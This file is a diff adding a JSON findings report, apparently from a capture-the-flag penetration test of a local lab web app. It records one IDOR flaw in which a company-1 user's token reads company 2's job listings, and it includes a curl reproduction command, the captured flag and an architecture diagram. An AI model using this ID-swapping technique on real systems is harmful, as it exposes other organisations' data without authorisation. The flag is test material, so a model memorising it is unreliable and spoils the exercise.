@@ -1,0 +1,32 @@
+{
+  "meta": {
+    "created": "2026-04-12T21:45:55.266693+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "d2c3b95b-e88b-40ea-85dc-4cfc40dd55ca",
+      "timestamp": "2026-04-12T21:45:55.266603+00:00",
+      "title": "IDOR - Unauthorized Access to Other Companies' Job Listings (CTF Flag)",
+      "severity": "critical",
+      "target": "http://172.17.0.1:58523/company/{company_id}/jobs",
+      "description": "The /company/{company_id}/jobs endpoint is vulnerable to Insecure Direct Object Reference (IDOR). An authenticated user belonging to Company 1 can access the job listings of any other company by simply changing the company_id path parameter. No authorization check is performed to verify that the requesting user belongs to the requested company. This exposed Company 2's secret job entry containing the CTF flag.",
+      "evidence": "Request: GET /company/2/jobs with demo user's JWT (sub=demo, company=1)\nResponse contains: <p>secret:flag{cfbc7583-4a96-4662-835b-81c9f5317b56}</p>\n\nFull response body:\n<h2>Jobs for Company 2</h2>\n<li>company2 Job 1:company2 Job 1 Description</li>\n<li>company2 Job 2:company2 Job 2 Description</li>\n<li>secret:flag{cfbc7583-4a96-4662-835b-81c9f5317b56}</li>",
+      "tool_used": "manual HTTP enumeration",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -b 'access_token=Bearer <demo_jwt>' http://172.17.0.1:58523/company/2/jobs",
+        "expected": "Returns job listing for Company 2 including the secret flag entry"
+      }
+    }
+  ],
+  "diagrams": [
+    {
+      "id": "4997736b-440c-4a76-bb5f-1e0d86d981bb",
+      "timestamp": "2026-04-12T21:46:06.943777+00:00",
+      "title": "Application Architecture",
+      "mermaid": "flowchart TD\n  Browser[\"Browser (Client)\"] --> Login[\"GET / - Login Page\"]\n  Browser --> TokenPost[\"POST /token - Authentication\"]\n  TokenPost --> JWT[\"JWT Cookie set (access_token)\"]\n  JWT --> CompanyJobs[\"GET /company/{company_id}/jobs\"]\n  CompanyJobs --> DB[\"Database - Company Job Listings\"]\n  CompanyJobs --> IDOR[\"IDOR VULN - No company ownership check\"]\n  Browser --> Docs[\"GET /docs - Swagger UI\"]\n  Browser --> OpenAPI[\"GET /openapi.json - API Spec\"]\n  Browser --> Ping[\"GET /ping - Health Check\"]\n  DB --> Flag[\"flag{cfbc7583-4a96-4662-835b-81c9f5317b56} in Company 2\"]"
+    }
+  ]
+}
